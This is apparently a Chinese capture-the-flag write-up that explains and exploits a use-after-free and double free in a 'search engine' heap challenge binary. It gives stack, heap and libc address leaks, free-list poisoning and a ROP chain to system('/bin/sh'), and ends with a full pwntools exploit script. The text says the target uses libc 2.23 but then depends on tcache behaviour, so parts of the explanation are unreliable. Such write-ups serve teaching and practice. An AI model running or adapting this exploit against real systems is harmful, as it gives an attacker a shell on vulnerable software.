# 漏洞利用文档补充说明

## 执行环境
- **运行环境**
  - Ubuntu 16.04
  - libc 2.23
- **缓解措施**
  - ASLR: on
  - PIE: off (程序基址固定为0x400000)
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on (但本漏洞利用未涉及绕过Canary)

## 漏洞成因
### 程序关键结构体
程序在索引句子时，会将句子分割为单词，并为每个单词创建一个节点，这些节点以链表形式组织。节点结构体定义如下（通过逆向分析推断）：
```c
struct word_node {
    char* word_ptr;          // 指向单词在句子中的起始位置，偏移 0
    int word_len;            // 单词的长度，偏移 8
    char pad[4];             // 填充，偏移 12
    char* sentence_ptr;      // 指向整个句子缓冲区的指针，偏移 16
    int sentence_size;       // 整个句子的大小，偏移 24
    struct word_node* prev;  // 指向前一个节点的指针，偏移 32
    // 结构体总大小为 40 字节 (0x28)
};
```
全局变量 `qword_6020B8` 指向链表的头节点。

### 漏洞定位
漏洞存在于搜索并删除句子的功能函数 `sub_400AD0` 中。当用户选择删除一个句子时，程序仅释放了 `sentence_ptr` 指向的句子缓冲区，**并未将该指针置空，也未将节点从链表中移除或释放**。
```c
if ( v3[0] == 121 ) // 用户输入 'y'
{
    memset(*(void **)(i + 16), 0, *(int *)(i + 24)); // 清空句子内容
    free(*(void **)(i + 16)); // 释放句子缓冲区
    puts("Deleted!");
    // 漏洞点：未将节点中的 sentence_ptr 置为 NULL，也未处理节点本身。
}
```
这导致了一个**悬空指针 (Dangling Pointer)**。该节点仍然存在于链表中，其 `sentence_ptr` 指向已被释放的内存。后续操作中：
1. **Use-After-Free (UAF)**：如果程序再次通过该节点访问 `sentence_ptr` 来读取句子内容，可以泄露堆内存信息。
2. **Double Free**：如果程序再次搜索并匹配到同一个单词，将导致对同一个 `sentence_ptr` 调用 `free()`，造成双重释放，进而可能引发 tcache poisoning 攻击。

## 漏洞利用过程
利用过程分为六步：
1. **泄露栈地址**：利用菜单读取函数的缓冲区溢出，泄露栈上的返回地址，计算出栈指针。
2. **泄露堆基址**：利用 UAF，释放两个小句子，读取其 `fd` 指针，计算出堆的起始地址。
3. **泄露 libc 基址**：利用 UAF，释放一个大的句子到 unsorted bin，读取其 `bk` 指针，计算出 libc 的基地址。
4. **触发 Double Free 并污染 Tcache**：通过精心构造的搜索与删除操作，实现对一个 size 为 0x30 的句子 chunk 的双重释放，并修改其 `fd` 指针指向栈上的目标地址。
5. **在栈上部署 ROP 链并获取 shell**：通过分配受控的节点，向栈上写入 ROP 链，劫持控制流。
6. **退出程序触发 ROP**：正常退出程序，执行流程跳转到栈上的 ROP 链，获取 shell。

### Step 1: 泄露栈指针
- **利用原理**：`sub_400A40` 函数中调用 `sub_4009B0(nptr, 48, 1)` 读取最多48字节的用户输入到 `nptr` 缓冲区。如果发送超过48字节且不含换行符，函数会填满48字节后返回，`nptr` 没有空字符终止。后续 `strtol` 失败时，`__printf_chk` 会打印 `nptr`，由于其未终止，会连带打印栈上后续数据，其中包括返回地址。
- **关键内存变化**：
  - 栈内存 `0x7ffcdd37e3b8` 处（保存的返回地址附近）的内容被部分覆盖为 `0x616161616161`（‘a’）。
  - 程序输出中包含栈地址 `0x7ffcdd37e408`，经计算得到栈指针 `stack_ptr = 0x7ffcdd37e3b8`。

### Step 2: 泄露堆基址
- **利用原理**：索引两个包含相同单词 “DREAM” 的句子。搜索 “DREAM” 并删除这两个句子，它们的大小（56字节）使其进入 tcache。随后，搜索一个长度为5的空单词（`\x00` * 4），程序会遍历链表，访问到第一个节点的 `sentence_ptr`（此时指向已释放的 tcache chunk）。通过输出句子内容，即可泄露该 chunk 的 `fd` 指针，该指针指向堆上的另一个 tcache chunk，从而计算出堆基址。
- **关键内存变化**：
  - 堆内存 `0x17964c0`（第一个句子 chunk 的用户数据区）在释放后，其开头的8字节由句子内容变为 `0x1796070`（指向 tcache 中下一个同类 chunk）。
  - 通过输出，泄露 `0x1796070`，计算得 `heap_base = 0x1795000`。

### Step 3: 泄露 libc 基址
- **利用原理**：索引一个大小为512字节的大句子并包含单词 “FLOWER”。搜索 “FLOWER” 并删除该句子，由于其大小超过 tcache 范围（默认最大为0x400），它会进入 unsorted bin。随后，搜索一个长度为6的空单词，访问节点的 `sentence_ptr`，即可泄露 unsorted bin 中 chunk 的 `bk` 指针（指向 `main_arena+88`）。
- **关键内存变化**：
  - 堆内存 `0x1796820`（大句子 chunk 的用户数据区）在释放后，其 `bk` 位置被写入 `0x7f1d8f63bb78`（`main_arena+88`）。
  - 通过输出，泄露该地址，计算得 `libc_base = 0x7f1d8f270000`。

### Step 4: 执行 Double Free 并污染 Tcache
- **利用原理**：索引三个包含单词 “ROCK” 的句子（大小均为0x30的chunk）。搜索 “ROCK” 并依次删除这三个句子，它们都进入 tcache for size 0x30。然后，搜索一个长度为4的空单词。此时，链表中的第一个节点 `sentence_ptr` 指向第一个句子 chunk（已释放）。由于比较的空单词匹配（chunk 内容可能为残留的 “ROCK” 或已被覆盖），程序会再次对该 `sentence_ptr` 调用 `free()`，造成 double free。通过后续的索引句子操作，可以分配节点并修改 tcache chunk 的 `fd` 指针。
- **关键内存变化**：
  - 执行后，tcache for size 0x30 的链表变为：`0x1796010` -> `0x1796070` -> `0x17960d0` -> `0x1796010`（循环，即 double free 状态）。
  - 随后，`write_to_stack_and_get_shell` 函数中的第一个 `index_sentence` 操作，会分配并修改 `0x1796010` 处 chunk 的 `fd` 指针，将其覆盖为 `stack_ptr + 0x52`（栈上的目标地址）。

### Step 5: 在栈上部署 ROP 链并获取 Shell
- **利用原理**：污染 tcache 后，后续的 `index_sentence` 操作会从被污染的链表中分配 chunk。首先分配的 chunk 位于 `stack_ptr + 0x52`，这是一个伪造在栈上的“句子缓冲区”。随后索引的句子内容将被写入这个地址，从而在栈上布置 ROP 链（`pop rdi; ret`, `/bin/sh`, `system`, `exit`）。
- **关键内存变化**：
  - 栈内存 `0x7ffcdd37e40a`（`stack_ptr + 0x52`）处被写入精心构造的 payload，覆盖了 `main` 函数的返回地址。
  - ROP 链部署完成，等待函数返回时执行。

### Step 6: 退出程序触发 Shell
- **利用原理**：调用 `quit_app()` 使 `main` 函数返回，控制流跳转到栈上布置的 ROP 链，依次执行 `pop rdi; ret` 设置参数，然后调用 `system(“/bin/sh”)`。
- **结果**：成功获取一个 shell。

## Exploit
```python
from pwn import *
import re
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_04_search_engine')
elf = ELF('./data/bin/heap23_04_search_engine')
libc = elf.libc

def menu():
    p.recvuntil(b'3: Quit')

def index_sentence(content):
    p.sendline(b'2')
    p.sendline(str(len(content)).encode())
    p.send(content)

def search_word(word):
    p.sendline(b'1')
    p.sendline(str(len(word)).encode())
    p.send(word)

def reply_yes():
    p.sendline(b'y')

def reply_no():
    p.sendline(b'n')

def quit_app():
    menu()
    p.sendline(b'3')

def leak_stack_ptr():
    menu()
    p.send(b'a'*96) # 发送超长数据，触发未终止的字符串打印，泄露栈地址
    p.recvuntil(b'is not a valid number')
    stackptr_match = re.findall(b'a{48}(......) is not', p.recvuntil(b'is not a valid number\n'))
    stackptr = u64(stackptr_match[0] + b'\0\0')
    return stackptr

def leak_heap_ptr():
    # 创建两个句子，释放后进入tcache，利用UAF泄露堆fd指针
    index_sentence(b'a'*50 + b' DREAM')
    menu()
    index_sentence(b'b'*50 + b' DREAM')
    menu()
    search_word('DREAM')
    reply_yes()
    reply_yes()
    menu()
    search_word(b'\0' * 5) # 搜索空单词，触发UAF读取
    p.recvuntil(b'Found 56: ')
    heapptr = u64(p.recvuntil(b'Delete')[:8])
    reply_no()
    return heapptr - 0x10b0 # 根据偏移计算堆基址

def leak_libc_ptr():
    # 创建大句子，释放到unsorted bin，利用UAF泄露libc地址
    menu()
    index_sentence(('b'*256 + ' FLOWER ').ljust(512, 'c'))
    menu()
    search_word('FLOWER')
    reply_yes()
    menu()
    search_word(b'\0'*6) # 搜索空单词，触发UAF读取
    p.recvuntil(b'Found 512: ')
    mainarena88 = u64(p.recvuntil(b'Delete')[:8])
    libcbase = mainarena88 - 0x3c4b78
    reply_no()
    return libcbase

def perform_double_free():
    # 创建三个句子，依次删除，然后触发对第一个句子chunk的double free
    menu()
    index_sentence(b'a'*51 + b' ROCK')
    menu()
    index_sentence(b'b'*51 + b' ROCK')
    menu()
    index_sentence(b'c'*51 + b' ROCK')
    menu()
    search_word('ROCK')
    reply_yes()
    reply_yes()
    reply_yes()
    menu()
    search_word(b'\0' * 4) # 触发double free的关键操作
    reply_yes()
    reply_no()

def write_to_stack_and_get_shell(stackptr, libcbase):
    # 通过污染的tcache，将chunk分配到栈上，并写入ROP链
    menu()
    # 此句分配到的chunk用于修改tcache fd，指向栈地址
    index_sentence(p64(stackptr + 0x52).ljust(48, b'\0') + b' MIRACLE')
    menu()
    index_sentence(b'd'*48 + b' MIRACLE')
    menu()
    index_sentence(b'e'*48 + b' MIRACLE')
    menu()
    rop = ROP(libc)
    pop_rdi = libcbase + rop.find_gadget(['pop rdi', 'ret']).address
    bin_sh = libcbase + next(libc.search(b'/bin/sh'))
    system_addr = libcbase + libc.sym['system']
    exit_addr = libcbase + libc.sym['exit']
    # 构造ROP链并写入栈上指定位置
    payload = (b'A'*6 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(exit_addr)).ljust(56, b'U')
    index_sentence(payload)

# 利用步骤开始
stack_ptr = leak_stack_ptr()          # Step 1: 泄露栈地址
heap_base = leak_heap_ptr()           # Step 2: 泄露堆基址
libc_base = leak_libc_ptr()           # Step 3: 泄露libc基址
perform_double_free()                 # Step 4: 触发double free并污染tcache
write_to_stack_and_get_shell(stack_ptr, libc_base) # Step 5: 在栈上部署ROP链
quit_app()                            # Step 6: 退出程序，触发shell
p.interactive()
```